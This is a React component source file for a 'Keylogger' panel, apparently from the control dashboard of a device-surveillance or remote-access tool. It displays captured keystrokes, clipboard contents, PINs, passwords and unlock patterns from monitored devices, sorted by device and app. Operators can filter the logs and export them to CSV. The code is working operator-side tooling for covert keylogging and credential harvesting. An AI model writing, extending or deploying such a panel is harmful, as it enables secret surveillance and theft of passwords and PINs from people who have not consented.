import React, { useRef, useEffect, useState } from 'react';
import { useStore } from '../store/useStore';

interface Props { deviceId?: string }

const TYPE_COLORS: Record<string, string> = {
  keyboard:  'text-cyan-400',
  clipboard: 'text-amber-400',
  pattern:   'text-violet-400',
  pin:       'text-red-400',
  password:  'text-rose-400',
};

export const KeyloggerPanel: React.FC<Props> = ({ deviceId }) => {
  const allLogs = useStore((s) => s.keylogs);
  const clearKeylogs = useStore((s) => s.clearKeylogs);
  const logs = deviceId ? allLogs.filter((l) => l.deviceId === deviceId) : allLogs;
  const [autoScroll, setAutoScroll] = useState(true);
  const [filterType, setFilterType] = useState<string>('all');
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (autoScroll) bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs.length, autoScroll]);

  const displayed = filterType === 'all' ? logs : logs.filter((l) => l.type === filterType);

  const exportCsv = () => {
    const rows = displayed.map((l) =>
      [new Date(l.timestamp).toISOString(), l.deviceId, l.type, l.app, JSON.stringify(l.text)].join(',')
    );
    const blob = new Blob([['ts,device,type,app,text', ...rows].join('\n')], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `keylogs-${Date.now()}.csv`;
    a.click();
  };

  return (
    <div className="h-full flex flex-col" style={{ fontFamily: 'var(--font-mono)' }}>
      {/* Toolbar */}
      <div className="px-4 py-2.5 border-b border-slate-800 flex items-center gap-2 shrink-0">
        <span className="text-xs font-semibold text-white/70 tracking-widest uppercase mr-2">Keylogger</span>

        {(['all', 'keyboard', 'clipboard', 'pin', 'password', 'pattern'] as const).map((t) => (
          <button
            key={t}
            onClick={() => setFilterType(t)}
            className={`text-[10px] px-2 py-0.5 rounded font-mono transition-colors ${
              filterType === t ? 'bg-slate-700 text-white' : 'text-slate-500 hover:text-slate-300'
            }`}
          >
            {t}
          </button>
        ))}

        <div className="ml-auto flex items-center gap-2">
          <button
            onClick={() => setAutoScroll((v) => !v)}
            className={`text-[10px] px-2 py-0.5 rounded font-mono transition-colors ${
              autoScroll ? 'bg-cyan-900/40 text-cyan-400' : 'text-slate-500 hover:text-slate-300'
            }`}
          >
            AUTO
          </button>
          <button
            onClick={exportCsv}
            className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono"
          >
            EXPORT
          </button>
          <button
            onClick={() => clearKeylogs(deviceId)}
            className="text-[10px] px-2 py-0.5 rounded bg-red-900/30 hover:bg-red-900/50 text-red-400 font-mono"
          >
            CLEAR
          </button>
        </div>
      </div>

      {/* Log area */}
      <div className="flex-1 overflow-y-auto px-2 py-1">
        {displayed.length === 0 && (
          <div className="flex items-center justify-center h-full">
            <p className="text-xs text-slate-600">No keylog entries</p>
          </div>
        )}
        {displayed.map((entry, i) => (
          <div
            key={`${entry.timestamp}-${i}`}
            className="flex items-start gap-3 py-1 border-b border-slate-900 hover:bg-slate-900/30 group"
          >
            <span className="text-[10px] text-slate-600 shrink-0 w-16 pt-0.5 select-none">
              {new Date(entry.timestamp).toLocaleTimeString('en', { hour12: false })}
            </span>
            <span className={`text-[10px] shrink-0 w-14 pt-0.5 font-mono ${TYPE_COLORS[entry.type] ?? 'text-slate-400'}`}>
              {entry.type.toUpperCase()}
            </span>
            <span className="text-[10px] text-slate-500 shrink-0 w-28 truncate pt-0.5">
              {entry.app}
            </span>
            <span className="text-xs text-white/80 break-all leading-relaxed">
              {entry.text}
            </span>
          </div>
        ))}
        <div ref={bottomRef} />
      </div>

      {/* Footer count */}
      <div className="px-4 py-1.5 border-t border-slate-800 text-[10px] text-slate-600 font-mono shrink-0">
        {displayed.length} entries
      </div>
    </div>
  );
};
